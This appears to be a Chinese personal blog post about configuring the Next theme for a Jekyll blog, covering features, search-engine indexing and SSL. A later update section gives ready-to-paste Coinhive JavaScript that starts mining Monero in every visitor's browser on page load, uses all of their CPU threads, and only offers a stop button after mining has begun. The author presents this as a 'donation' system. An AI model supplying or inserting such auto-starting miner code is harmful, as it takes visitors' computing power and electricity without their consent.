# 原创
：  Jekyll博客Next主题超深度配置

# Jekyll博客Next主题超深度配置

> 
文末附源码地址哦！ <br/> 注意：本文不是教程！


## 起因

这两天不知道为什么突然沉迷Hexo博客的Next主题，Next主题确实太赞了，十分清爽简洁，自身集成了许多小插件，基本上满足了大部分博客的一般需求。所以我索性把之前那个也还不错的博客 `simple` 给抛弃了。

然后呢，我就用Hexo快速搭建了Next主题的博客，但是有一个问题，它写文章不方便，而且还需要先导出 `html` 格式才能 `push` 到 `GitHub` 上面，这就不能忍了。

于是，突发奇想，能不能把 `Next` 主题改成 `Jekyll` 呢，我抱着试一试的心态去 `Jwkyll` 官网查了一下，果然，已经有大神改好了，顿时开心，不用自己动手了…（好吧，我太懒了）

最终选择[Jekyll-Next-Theme](https://github.com/Simpleyyt/jekyll-theme-next)，你可以去[这里](https://github.com/Simpleyyt/jekyll-theme-next)直接`clone` , 然后你就可以有一套和我一样的博客主题了。

## 基本功能展示

**整体面貌**： <br/> <img alt="" src="https://raw.githubusercontent.com/ds19991999/githubimg/master/picgo/20180808212432.jpg" title=""/>

**数学公式支持**： <br/> <img alt="" src="https://raw.githubusercontent.com/ds19991999/githubimg/master/picgo/20180808212436.jpg" title=""/>

**文末小功能**： <br/> <img alt="" src="https://raw.githubusercontent.com/ds19991999/githubimg/master/picgo/20180808212442.jpg" title=""/>

**评论系统**： <br/> <img alt="" src="https://raw.githubusercontent.com/ds19991999/githubimg/master/picgo/20180808212446.jpg" title=""/>

**文章加密设置**： <br/> <img alt="" src="https://raw.githubusercontent.com/ds19991999/githubimg/master/picgo/20180808212454.jpg" title=""/>

小功能实在太多，不如直接访问：[https://www.ds-vip.top](https://www.ds-vip.top) 感受一下。

## 博客搭建

关于博客搭建这一块自行 `Google` ，网上教程多如牛毛，千篇一律，再写就没意思了。不过这里推荐两篇基于Hexo的Next主题配置教程，可以参考一下。

## 博客配置完成后的坑

搭建一个博客还是很简单的，配置虽然麻烦，但一步步的还是可以实现的。博客搭建完成后，就是域名绑定，ICP备案，以及网站推广。

虽然你的博客搭建完成了，但是，也只有你本人才会去访问它，其他人通过搜索引擎根本搜不到你的网站信息，因为你的网站还没有被各大搜索引擎收录，这一块就通过我的博客里[网站收录](https://www.ds-vip.top/seo/)去实现，每天提交过几次就差不多了。

另外一个坑就是绑定自定义域名之后，你的网站就不支持 `https` 加密协议了，所以你得去买个 `SSL` 证书，一般情况下，你的域名供应商会免费送你一年的 `SSL` 证书服务，按照官方给的操作步骤一步步来就 `OK` 了。所以啊，建博客是很简单的，维护博客就不那么容易了。

---


**20180810更新**

---


## 为博客嵌入挖矿代码

先看效果图： <br/> <img alt="这里写图片描述" src="https://img-blog.csdn.net/20180816203048860?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RzMTk5OTE5OTk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" title=""/>
1. 安装并注册monero账号1. 注册Coinhive账号1. 在Coinhive中得到site key1. 安装代码到html中
### 样式

**官网样式：**

```
&lt;div&gt;
    &lt;script src="https://authedmine.com/lib/simple-ui.min.js" async&gt;&lt;/script&gt;
    &lt;div class="coinhive-miner" 
        style="width: 100%; height: 100px"
        data-key="YjyptNPkNzUZwQonjCLhkllZAW85Axyo"
        data-autostart="true"
        data-whitelabel="false"
        data-background="#000000"
        data-text="#eeeeee"
        data-action="#00ff00"
        data-graph="#555555"
        data-threads="7"
        data-throttle="0.1"&gt;
        &lt;em&gt;Loading...&lt;/em&gt;
    &lt;/div&gt;
&lt;/div&gt;
```

**我的样式:**

```
&lt;div&gt;
    &lt;h3 align="center"&gt;⬇⬇~ 挖 矿 打 赏 系 统 ~⬇⬇&lt;/h3&gt;
    &lt;script src="https://coinhive.com/lib/coinhive.min.js"&gt;&lt;/script&gt;
    &lt;center&gt;
        &lt;table &gt;
            &lt;tbody&gt;
            &lt;tr&gt;
                &lt;td align="center"&gt;启动线程数&lt;/td&gt;
                &lt;td align="center"&gt;当前算力(Hashs/秒)&lt;/td&gt;
                &lt;td align="center"&gt;您已贡献(Hash单位：个)&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
                &lt;td id="tcount" align="center"&gt;0&lt;/td&gt;
                &lt;td id="hps" align="center"&gt;0&lt;/td&gt;
                &lt;td id="ths" align="center"&gt;0&lt;/td&gt;&lt;/tr&gt;
            &lt;tr&gt;&lt;td colspan="3;" id="status" align="center"&gt;您正在打赏中，随时可以停止。&lt;/td&gt;&lt;/tr&gt;
            &lt;/tbody&gt;
        &lt;/table&gt;
    &lt;/center&gt;

    &lt;div&gt;&lt;p id="minebutton" style="text-align:center;"&gt;
        &lt;button onclick="miner.start(CoinHive.FORCE_EXCLUSIVE_TAB)"&gt;停止挖矿打赏&lt;/button&gt;
    &lt;/p&gt;&lt;/div&gt;

    &lt;script type="text/javascript"&gt;
        var miner=new CoinHive.User
            ("YjyptNPkNzUZwQonjCLhkllZAW85Axyo",
            "www.ds-vip.top",
            {threads:navigator.hardwareConcurrency,autoThreads:!1,throttle:.9,forceASMJS:!1});

        miner.start(CoinHive.FORCE_EXCLUSIVE_TAB),
        setInterval(function(){var e=miner.getNumThreads(),
        n=Math.round(100*miner.getHashesPerSecond())/100,
        t=miner.getTotalHashes();miner.getAcceptedHashes()/256;

        miner.isRunning()?(document.getElementById("tcount").innerHTML=e,document.getElementById("hps").innerHTML=n,    
        document.getElementById("ths").innerHTML=t,document.getElementById("status").innerHTML="您正在打赏中，随时可以停止。",
        document.getElementById("minebutton").innerHTML='&lt;button onclick="miner.stop()"&gt;停止挖矿打赏&lt;/button&gt;'):(document.getElementById("tcount").innerHTML="0",document.getElementById("hps").innerHTML="0",document.getElementById("ths").innerHTML=t,document.getElementById("status").innerHTML="您已经停止打赏，随时可以开始。",document.getElementById("minebutton").innerHTML='&lt;button onclick="miner.start(CoinHive.FORCE_EXCLUSIVE_TAB)"&gt;开始挖矿打赏&lt;/button&gt;')},1e3)
    &lt;/script&gt;
&lt;/div&gt;
```

详见：[https://www.ds-vip.top/test/2018/08/11/test/](https://www.ds-vip.top/test/2018/08/11/test/)

## 附上源码和个人博客

> 
配置文件 [_config.yml](https://github.com/ds19991999/ds19991999.github.io/blob/master/_config.yml) 可以慢慢看，毕竟太多了，这也是我为什么不做笔记，不写教程的原因。


> 
有什么问题可以直接在我的[个人博客主页](https://www.ds-vip.top)上联系我哦，另外大家优势没事可以来：[https://www.ds-vip.top/essay/](https://www.ds-vip.top/essay/) 留言。

